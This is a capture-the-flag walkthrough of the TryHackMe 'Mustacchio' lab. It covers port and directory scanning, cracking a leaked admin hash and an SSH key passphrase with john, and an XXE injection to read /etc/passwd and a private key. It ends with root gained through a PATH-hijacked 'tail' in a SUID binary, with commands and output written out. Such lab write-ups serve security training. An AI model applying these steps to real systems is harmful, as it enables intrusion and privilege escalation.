**THM** : Mustacchio<br>
**Room Link** : https://tryhackme.com/room/mustacchio<br>
**Difficulty** : Easy <br>
**Flags to capture** : User and Root<br>
**Key Topics, Techniques, and Tools** : <br>
 - Ports and Services scan : [nmap](https://nmap.org/)
 - Web content discovery : [gobuster](https://github.com/OJ/gobuster)
 - [Local File Inclusion vulnerability](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
 - Linux privileges escalation
 - Bash scripting 

<p align="center">   <img src="https://i.imgur.com/dK4ohgB.png"> </p>  

# Summary

- [Adding IP to the hosts file](#adding-ip-to-the-hosts-file)
- [Nmap scan](#nmap-scan)
- [Web content discovery](#web-content-discovery)
- [FTP enumeration](#ftp-enumeration)
- [LFI exploit](#lfi-exploit)
- [User flag](#user-flag)
- [Privilege escalation](#privilege-escalation)

<p align="center">   <img src="https://i.imgur.com/Kmtrf12.png"> </p> 

## Adding IP to the hosts file 
I start by adding the IP of the machine to my hosts file:<br>
```
echo "10.10.68.254 mustacchio.thm"|sudo tee -a /etc/hosts
```   

## Nmap scan

I perform an `Nmap` scan on the target host and save the output to a file called `nmapResults.txt` <br>
The scan includes all ports `-p-` and uses aggressive scan options `-A` <br>

```
└─# nmap mustacchio.thm -A -p- -oN nmapResults.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:07 CEST
Nmap scan report for mustacchio.thm (10.10.68.254)
Host is up (0.031s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 581b0c0ffacf05be4cc07af1f188611c (RSA)
|   256 3cfce8a37e039a302c77e00a1ce452e6 (ECDSA)
|_  256 9d59c6c779c554c41daae4d184710192 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (92%), Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Android 7.1.1 - 7.1.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   31.15 ms 10.8.0.1
2   31.33 ms mustacchio.thm (10.10.68.254)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.98 seconds 
```

There are 3 open ports :
- `SSH` - `OpenSSH 7.2p2` on port `22`
- `HTTP` - `Apache httpd 2.4.18` on port `80`
- `HTTP` - `nginx 1.10.3` on port `8765`
<br>

I didn't find any exploit on the versions of the different services, so I choose to start by the website enumeration.

## Web Content Discovery  

<img src="https://i.imgur.com/cLKNo8K.png">

I can't find anything interesting on the website on port `80` or in the source code, so I decide to run a `gobuster` scan to enumerate the site's directories :
```
└─# gobuster dir -u http://mustacchio.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php.bk
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mustacchio.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php.bk,txt
[+] Timeout:                 10s
===============================================================
2023/05/25 19:28:04 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [--> http://mustacchio.thm/images/]
/custom               (Status: 301) [Size: 317] [--> http://mustacchio.thm/custom/]
/robots.txt           (Status: 200) [Size: 28]
/fonts                (Status: 301) [Size: 316] [--> http://mustacchio.thm/fonts/]
```

In parallel with the `gobuster` scan, I check the content of the second site on port `8765` and discover an admin panel. I then test different combinations such as `admin:password` without success. So I go back to the scan results and have a look at the first website.
<img src="https://i.imgur.com/QskxDqT.jpg">

I found an interesting file `users.bak` which seems to be an archive in the directory `/custom/js`. I download it to see what it contains :  
<img src="https://i.imgur.com/KsQ8iQg.png">

## Password cracking

In the file, which is an SQLite database file, I find a username (`admin`) and a SHA1 hash. These credentials could be those of the admin panel discovered earlier, so I try to crack the hash using `john` with the wordlist `rockyou.txt` :

```
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldog19        (?) 
```
I manage to connect to the admin panel using the credentials I found and it works :  
<img src="https://i.imgur.com/gAZo6tJ.png">

## XXE exploit
The admin panel features a text box in which you can apparently enter a comment on the website :

<img src="https://i.imgur.com/TwAEVbV.png">

I try posting something but an error displays : `Insert XML Code!` Below the form there is a preview of the comment that shows name, author, and comment fields with no content.
Before trying to exploit it, I take a look at the source code :  
<img src="https://i.imgur.com/2eCHI0T.png">

In the source code, I found two interesting pieces of information in the form of comments:
- The developer mentions an `SSH key`, which could be a lead to follow to enable me to connect via `SSH`.
- There's mention of a path `/auth/dontforget.bak` to which I go and retrieve a .bak file named `dontforget.bak`.

I check the contents of the `dontforget.bak` file and discover what looks like a sample of the XML the form accepts :
```
└─# cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>   
```

I copy and paste this text directly into the form and submit it, and I can see the entry reflected on the page : 
<img src="https://i.imgur.com/xZVMXTY.png">

Thanks to the information gathered earlier, there seems to be an XML injection vulnerability present on the website. The following resources have been useful in furthering my knowledge of XML injections: `https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity` 

I start by performing a new entity test to determine whether a simple new ENTITY declaration would work. To do this, I make sure to use the XML structure seen earlier in the dontforget.bak file and declare a new entity named `xxe` which will be called in `<author>` to display the following string : `XXE INJECTION` :
<img src="https://i.imgur.com/eGUbZn1.png">

It works, I can see the expected output. Next, I try to see if I could read the contents of the file /etc/passwd :

<img src="https://i.imgur.com/gQts8Ko.png">

This is also successful, as I can see the contents of the /etc/passwd file.   
Now that I have confirmed that I can read files, the next step is to retrieve the `SSH key` for the user `Barry`, based on the developers comment found earlier :

<img src="https://i.imgur.com/YvuQLcf.png">

I get the ssh key of the user `barry`.  


## User flag
Now that I have the SSH key, I change the permissions on the key and try to connect, but I'm prompted for a passphrase :
```
└─# chmod 600 id_rsa      
└─# ssh -i id_rsa barry@mustacchio.thm 
Enter passphrase for key 'id_rsa': 
barry@mustacchio.thm: Permission denied (publickey).
```

I use `John` to crack the passphrase for the SSH key :

```
└─# ssh2john id_rsa > id_rsa.hash  
└─# john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)     
1g 0:00:00:01 DONE (2023-06-04 17:02) 0.7874g/s 2339Kp/s 2339Kc/s 2339KC/s urieljr.k..urielito1000
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I can now connect to `ssh` with the `ssh key` :
```
└─# ssh -i id_rsa barry@mustacchio.thm 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ 
```

Let's get the user.txt flag :
```
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cat user.txt 
**********************
```

## Privilege escalation
After having obtained a user access, I now try to get a root access in order to recover the root flag. <br>

As always, on a linux machine, I run the command `sudo -l` to find commands which we can execute as other users but a password is requested :
```
barry@mustacchio:~$ sudo -l
sudo: unable to resolve host mustacchio: Connection refused
[sudo] password for barry: 
```

I run the command `find / -perm -4000 -type f` to find all files with the `SUID bit` set and I discover an interesting file called `live_log` which is in the `/home/` directory of user `joe`.  
Using the strings command, I could see that the file was using the `tail` command to read the last 10 entries in the /var/log/nginx/access.log file: :

```
barry@mustacchio:/home/joe$ strings live_log 
[...]
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
[...]
```

With the `SUID bit` is set for the file and the `tail` commane is using without specifying the full path. I can exploit this by creating a new binary and editing the `$PATH environment variable` to run a `root shell`.  

So I create a file in the `/tmp` directory called `tail`, that when executed would run a shell. I then edited the $PATH variable to point to where I create my file. And then, I execute the `live_log` file again, which run a root shell :
 
```  
barry@mustacchio:/home/joe$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/home/joe$ cd /tmp
barry@mustacchio:/tmp$ echo "/bin/bash" > tail
barry@mustacchio:/tmp$ chmod 777 tail
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ cd /home/joe/
barry@mustacchio:/home/joe$ ./live_log 
root@mustacchio:/home/joe# whoami
root
``` 

I can now retrieve the root flag :
```
root@mustacchio:/home/joe# cd /root/
root@mustacchio:/root# ls
root.txt
root@mustacchio:/root# cat root.txt 
****************************
```

